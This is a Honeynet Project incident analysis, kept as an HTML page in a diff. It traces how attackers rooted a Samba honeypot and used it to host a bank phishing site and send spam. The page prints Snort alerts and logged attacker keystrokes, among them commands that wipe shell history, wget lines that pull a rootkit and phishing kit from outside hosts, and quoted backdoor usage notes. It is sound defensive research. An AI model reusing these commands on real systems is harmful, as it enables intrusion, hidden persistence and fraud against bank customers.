@@ -1,0 +1,285 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Know Your Enemy: Phishing</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="../phishing.css" rel="stylesheet" type="text/css">
+</head>
+
+<body>
+<div id="header">
+	<h1>Know Your Enemy:<br>Phishing</h1>
+	<h3 id="subtitle">Detailed analysis of UK phishing incident timeline</h3>
+	<p id="metainfo">
+  <a href="mailto:project@honeynet.org?Subject=Know%20Your%20Enemy">The Honeynet
+		Project &amp; Research Alliance</a><br>
+  <a href="http://www.honeynet.org/">http://www.honeynet.org</a><br>
+  Last Modified: 16th May 2005
+</p>
+</div>
+
+<p> This honeynet was a high interaction research honeynet deployed by the <a
+	href="http://www.ukhoneynet.org/">UK Honeynet Project</a> in a UK ISP data
+centre. After a few hours of general background network activity, the Redhat
+Linux 7.3 honeypot was scanned, compromised and an IRC server installed. A
+number of further compromises occurred, as multiple attackers located the
+vulnerable system and exploited it for their own purposes, before the honeypot
+server was used to host a phishing attack targeting a well known US bank.
+For brevity, this detailed timeline only covers the activity relevant to the phishing attack.</p>
+
+<p><b>Detailed timeline:</b></p>
+
+<p>18/07/04 - 12:30. First the attacker exploits a buffer overflow in the samba server on
+the Redhat Linux 7.3 honeypot, as can be seen from the snort alerts shown
+below:</p>
+
+<pre>[**] [1:2103:9] NETBIOS SMB trans2open buffer overflow attempt [**]
+[Classification: Attempted Administrator Privilege Gain] [Priority: 1]
+07/18-12:30:37.816057 69.44.XXX.XXX:47938 -&gt; 10.2.2.120:139
+TCP TTL:53 TOS:0x0 ID:29658 IpLen:20 DgmLen:1500 DF
+***A**** Seq: 0x476AC1E0 Ack: 0x2E249707&nbsp; Win: 0xB68 TcpLen: 32
+TCP Options (3) =&gt; NOP NOP TS: 214020820 6062617
+[Xref=&gt; <a href="http://www.digitaldefense.net/labs/advisories/DDI-1013.txt"><span lang=EN style='font-size:8.0pt;font-family:"Courier New"'>http://www.digitaldefense.net/labs/advisories/DDI-1013.txt</span></a>]
+[Xref =&gt; <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2003-0201"><span lang=EN style='font-size:8.0pt;font-family:"Courier New"'>http://cve.mitre.org/cgi-bin/cvename.cgi?name=2003-0201</span></a>]
+[Xref=&gt; </span><a href="http://www.securityfocus.com/bid/7294"><span lang=EN style='font-size:8.0pt;font-family:"Courier New"'>http://www.securityfocus.com/bid/7294</span></a><span lang=EN style='font-size:8.0pt;font-family:"Courier New"'>]
+
+[**] [1:648:7] SHELLCODE x86 NOOP [**]
+[Classification: Executable code was detected] [Priority: 1]
+07/18-12:30:37.817422 69.44.XXX.XXX:47938 -&gt; 10.2.2.120:139
+TCP TTL:53 TOS:0x0 ID:29659 IpLen:20 DgmLen:1500 DF
+***AP*** Seq: 0x476AC788 Ack: 0x2E249707&nbsp; Win: 0xB68 TcpLen: 32
+TCP Options (3) =&gt; NOP NOP TS: 214020820 6062617
+[Xref =&gt; </span><a href="http://www.whitehats.com/info/IDS181"><span lang=EN style='font-size:8.0pt;font-family:"Courier New"'>http://www.whitehats.com/info/IDS181</span></a>]
+</pre>
+
+<p>18/07/04 - 12:30. After a few retries with different offsets, the samba exploit (<a
+href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2003-0201">CAN-2003-0201</a>)
+succeeds and returns a root prompt to the attacker, as show by the snort alert
+below:</p>
+
+<pre>
+[**] [1:498:6] ATTACK-RESPONSES id check returned root [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+07/18-12:30:55.511182 10.2.2.120:45295 -&gt; 69.44.XXX.XXX:48283
+TCP TTL:64 TOS:0x0 ID:56468 IpLen:20 DgmLen:140 DF
+***AP*** Seq: 0x2E1F5FBE Ack: 0x47D426D5&nbsp; Win: 0x16A0 TcpLen: 32
+TCP Options (3) =&gt; NOP NOP TS: 6064395 214022589
+</pre>
+
+<p>18/07/04 - 12:30. After gaining root access, the attacker check who they are and who else is logged into the system before attempting to hide their activities by turning off shell history logging. The <a href="http://www.honeynet.org/tools/sebek">Sebek</a> keystrokes for this session are shown below:</p>
+
+<pre>
+[2004-07-18 12:30:55 10.2.2.120 11675 sh 0]unset HISTFILE; echo &quot;### 0wned this server ###&quot;;
+                                           uname -a;id;uptime;ca
+[2004-07-18 12:30:55 10.2.2.120 11675 sh 0]su
+[2004-07-18 12:30:59 10.2.2.120 11851 bash 0]unset HISTFILE
+[2004-07-18 12:31:01 10.2.2.120 11851 bash 0]unset HISTSAVE
+[2004-07-18 12:31:03 10.2.2.120 11851 bash 0]unset HISTLOG
+</pre>
+
+<p>18/07/04 - 12:31. The attacker then proceeds to downloading what appears to be an image file from a remote web server using the wget command line HTTP client:</p>
+
+<pre>
+[2004-07-18 12:31:06 10.2.2.120 11851 bash 0]mkdir /dev/hpd
+[2004-07-18 12:31:08 10.2.2.120 11851 bash 0]cd /dev/hpd
+[2004-07-18 12:31:09 10.2.2.120 11851 bash 0]id
+[2004-07-18 12:31:10 10.2.2.120 11851 bash 0]w
+[2004-07-18 12:31:17 10.2.2.120 11851 bash 0]wget host1.3x.ro/shv4.jpg
+</pre>
+
+<p>18/07/04 - 12:32. The attacker unpacks the &#8220;image&#8221; file, which is actually
+a gzip&#8217;ed tar archive, before extracting and running a setup program:</p>
+
+<pre>
+[2004-07-18 12:32:21 10.2.2.120 11851 bash 0]tar zxvf shv4.jpg ; rm -rf shv4.jpg
+[2004-07-18 12:32:23 10.2.2.120 11851 bash 0]cd shv4
+[2004-07-18 12:32:28 10.2.2.120 11851 bash 0]./setup admin 2277
+</pre>
+
+<p>The attacker&#8217;s view of this session can be found <a
+	href="uk-analysis.html">here</a>.
+Analysis showed that the malware installed was the <a
+	href="https://tms.symantec.com/members/AnalystReports/030929-Analysis-SHV4Rootkit.pdf">SHV4
+	root kit</a>, previously the subject of the <a
+	href="http://www.honeynet.org/scans/scan29/">Honeynet Project&#8217;s Scan of
+	the Month challenge 29</a>. </p>
+
+<p>From the SHV4 root kit source code, we can determine what the setup command
+does:</p>
+
+<pre>
+# USAGE:
+# ./setup pass port
+#
+# SSHD backdoor: ssh -l root -p port hostname
+# when prompted for password enter your rootkit password
+# login backdoor: DISPLAY=pass&nbsp;; export DISPLAY&nbsp;; telnet victim
+# type anything at login, and type arf for pass and b00m r00t
+#
+# if u g3t cought d0nt blaim us&nbsp;!!
+</pre>
+
+<p>The attacker has installed and configured an encrypted backdoor on the honeypot, bound to
+TCP port 2277. A large amount of other activity occurs on the system over the
+next few 12-72 hours, including installation of PsyBNC IRC servers by a Romanian
+group, installation and usage of the mole and mazz mass scanners (probably the
+autorooter used to compromise this honeypot), installation and re-installation
+of other rootkits, password sniffing and various other activities not relevant
+to the main phishing attack.</p>
+
+<p>23/07/04 - 21:11. The attacker returns from 192.226.XXX.XXX (a Windows 2000 or Windows XP
+PC in Ontario) via the SSH backdoor listening on TCP port 2277 and checks if the server is still active and who is logged in:</p>
+
+<pre>
+[2004-07-23 21:11:58 xntps 0]SSH-1.5-PuTTY-Release-0.52
+[2004-07-23 21:12:39 bash 0]discovery[BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                            [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]w
+[2004-07-23 21:12:44 bash 0]unset HISTFILE
+[2004-07-23 21:12:46 bash 0]unset HISTSAVE
+</pre>
+
+<p>23/07/04 - 21:13. The attacker reconnects, prepares a directory in the Apache web
+server's document root and then downloads some pre-built web content from a Romanian web server using, again using wget, before checking the honeypot's IP address and PHP configuration:</p>
+
+<pre>
+[2004-07-23 21:13:06 10.2.2.120 16984 xntps 0]SSH-1.5-PuTTY-Release-0.54
+[2004-07-23 21:13:26 10.2.2.120 16986 bash 0]unset HISTFILE
+[2004-07-23 21:13:29 10.2.2.120 16986 bash 0]cd /var/www
+[2004-07-23 21:13:29 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:13:30 10.2.2.120 16986 bash 0]ls -a
+[2004-07-23 21:13:35 10.2.2.120 16986 bash 0]cd html
+[2004-07-23 21:13:35 10.2.2.120 16986 bash 0]ls -a
+[2004-07-23 21:13:52 10.2.2.120 16986 bash 0]mk[BS][BS][BS][BS][BS][BS][BS]mkdir .internetBankingLogon
+[2004-07-23 21:13:59 10.2.2.120 16986 bash 0]cd [BS][BS][BS][BS][BS][BS]ls
+[2004-07-23 21:14:43 10.2.2.120 16986 bash 0]wget host2.go.ro/bank/bank.zip
+</pre>
+
+<p>23/07/04 - 21:15. The attacker attempts to extract the contents of the zip file but finds it is corrupt and deletes it.</p>
+
+<pre>
+[2004-07-23 21:15:23 10.2.2.120 16986 bash 0]tar xzvf ba[BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  unzip bank.zip
+[2004-07-23 21:15:26 10.2.2.120 16986 bash 0]ls -a
+[2004-07-23 21:15:36 10.2.2.120 16986 bash 0]tar xzvf bank.zip
+[2004-07-23 21:15:42 10.2.2.120 16986 bash 0]rm -rf bank.zip
+</pre>
+
+<p>23/07/04 - 21:16. The attacker changes tools and gets another file using FTP, again from the same web server in Romania, which does extract successfully this time:</p>
+
+<pre>
+[2004-07-23 21:15:53 10.2.2.120 16986 bash 0]ftp host2.go.ro
+[2004-07-23 21:16:05 10.2.2.120 17044 ftp 0]hash
+[2004-07-23 21:16:06 10.2.2.120 17044 ftp 0]ls
+[2004-07-23 21:16:09 10.2.2.120 17044 ftp 0]cd bank
+[2004-07-23 21:16:09 10.2.2.120 17044 ftp 0]ls
+[2004-07-23 21:16:13 10.2.2.120 17044 ftp 0]cd ..
+[2004-07-23 21:16:14 10.2.2.120 17044 ftp 0]ls
+[2004-07-23 21:16:40 10.2.2.120 17044 ftp 0]get bank1.tgz
+[2004-07-23 21:16:45 10.2.2.120 17044 ftp 0]bye
+[2004-07-23 21:16:46 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:16:52 10.2.2.120 16986 bash 0]tar xzvf bank1.tgz
+[2004-07-23 21:16:54 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:17:03 10.2.2.120 16986 bash 0]rm -rf bank1
+[2004-07-23 21:17:04 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:17:19 10.2.2.120 16986 bash 0]mv bank .internetBankingLogon
+[2004-07-23 21:17:20 10.2.2.120 16986 bash 0]ls
+</pre>
+
+<p>23/07/04 - 21:17. The attacker edits the extracted web content and updates the HTML to point to a testing PHP script on a remote web server:</p>
+
+<pre>
+[2004-07-23 21:17:23 10.2.2.120 16986 bash 0]cd .internetBankingLogon
+[2004-07-23 21:17:24 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:17:29 10.2.2.120 16986 bash 0]pico
+[2004-07-23 21:17:44 10.2.2.120 16986 bash 0]pico popup.htm
+[2004-07-23 21:17:48 10.2.2.120 17058 pico 0][U-ARROW]l
+[2004-07-23 21:18:41 10.2.2.120 16986 bash 0]pico popup.html
+[2004-07-23 21:19:04 10.2.2.120 17060 pico 0][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]
+                                                  [D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW][D-ARROW]php
+[2004-07-23 21:19:17 10.2.2.120 16936 bash 0]telbnet
+[2004-07-23 21:19:19 10.2.2.120 16936 bash 0]
+[2004-07-23 21:22:19 10.2.2.120 17060 pico 0][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW]
+                                                  [R-ARROW][R-ARROW][R-ARROW][R-ARROW][R-ARROW][R-ARROW][R-ARROW][R-ARROW]
+                                                  [R-ARROW][R-ARROW][R-ARROW][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                                                  [BS][BS][BS][BS][BS][BS][BS][BS]http://69.24.XXX.XXX/testing.php[D-ARROW]
+                                                  [L-ARROW][L-ARROW][U-ARROW][U-ARROW][D-ARROW][D-ARROW][U-ARROW][U-ARROW]
+                                                  [D-ARROW][R-ARROW]y
+</pre>
+
+<p>23/07/04 - 21:22. The attacker checks the network configuration of the honeypot and version of PHP installed:</p>
+
+<pre>
+[2004-07-23 21:22:29 10.2.2.120 16986 bash 0]ls
+[2004-07-23 21:22:31 10.2.2.120 16986 bash 0]pwd
+[2004-07-23 21:25:06 10.2.2.120 16986 bash 0]/sbin/ifconfig
+[2004-07-23 21:25:25 10.2.2.120 16936 bash 0]sense
+[2004-07-23 21:48:36 10.2.2.120 16936 bash 0]php
+[2004-07-23 21:48:42 10.2.2.120 16936 bash 0]/sbin/ifconfig
+[2004-07-23 22:10:26 10.2.2.120 16936 bash 0]sense
+[2004-07-23 22:28:32 10.2.2.120 16936 bash 0]ade[BS][BS][BS][BS][BS]qw
+[2004-07-23 22:28:33 10.2.2.120 16936 bash 0]w
+</pre>
+
+<p>25/07/04 - 21:42. The attacker opens a second session, checks again if PHP is
+configured correctly on the honeypot and downloads a tool for sending spam email from the same Romanian web server:</p>
+
+<pre>
+[2004-07-25 21:42:25 xntps 0]SSH-1.5-PuTTY-Release-0.54
+[2004-07-25 21:42:46 bash 0]unset HISTFILE
+[2004-07-25 21:42:50 bash 0]cat /etc/hosts
+[2004-07-25 22:07:28 bash 0]php
+[2004-07-25 22:07:32 bash 0]cd /tmp
+[2004-07-25 22:07:41 bash 0]wget host2.go.ro/sendbankNEW.tgz
+[2004-07-25 22:07:50 bash 0]tar xzvf sendbankNEW.tgz&nbsp;; rm -rf sendbankNEW.tgz
+</pre>
+
+<p>25/07/04 - 22:08. The attacker checks an input list email addresses and runs a PHP script to send spam email:</p>
+
+<pre>
+[2004-07-25 22:08:00 bash 0]cd sendbank/
+[2004-07-25 22:08:01 bash 0]ls
+[2004-07-25 22:08:09 bash 0]cat list.
+[2004-07-25 22:08:46 bash 0]ls
+[2004-07-25 22:08:52 bash 0]php bank.php
+</pre>
+
+<p>25/07/04 - 22:10. The attacker edits the content of the spam message, points it a co-located Linux web server running an American student web site, and runs the PHP script to send spam email again:</p>
+
+<pre>
+[2004-07-25 22:10:22 bash 0]pico bla.txt
+[2004-07-25 22:10:26 pico 0]php
+[2004-07-25 22:13:33 pico 0][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW]
+                            [L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW]
+                            [L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW][L-ARROW]
+                            [L-ARROW][L-ARROW][L-ARROW][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]
+                            [BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]<b>XXX.com</b>/.y
+[2004-07-25 22:13:36 bash 0]php bank.php
+[2004-07-25 22:24:48 bash 0]cd ..
+[2004-07-25 22:24:49 bash 0]ls
+[2004-07-25 22:24:53 bash 0]rm -rf sendbank
+</pre>
+
+<p>The attackers initial test at 22:08:52 works as planned, with 5 test messages
+being successfully sent (although due to the outbound traffic restrictions on the <a href="http://www.honeynet.org/tools/cdrom">Honeywall</a>, further mass mailing attempts would fail). However, after 10 minutes wait the attacker cleans up and leaves without sending any
+further messages from this honeypot.</p>
+
+</div>
+
+<p align="center"><a href="http://www.honeynet.org/"><img src="../images/small.gif"
+	alt="The Honeynet Project" width="143" height="34" border="0"></a> </p>
+
+<p>&nbsp; </p>
+</body>
+</html>
